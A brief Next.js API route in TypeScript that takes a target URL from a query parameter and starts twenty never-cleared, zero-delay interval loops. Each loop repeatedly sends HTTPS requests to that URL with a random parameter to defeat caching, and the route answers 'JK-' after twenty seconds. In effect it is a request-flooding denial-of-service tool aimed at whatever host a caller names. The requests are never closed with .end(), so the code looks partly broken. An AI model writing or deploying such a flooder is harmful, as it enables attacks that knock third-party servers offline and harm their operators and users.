import { request } from 'https'
import type { NextApiRequest, NextApiResponse } from 'next'

type ResponseData = {
    message: string
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for(var i = 0; i < 20; i++) {
        setInterval(() => {
            request(`${req.query.name}?ref=${Math.random()}`)
        })
    }
    
    setTimeout(() => {
        res.status(200).json({ message: `JK-${req.query.name}` })
    }, 20 * 1000)
}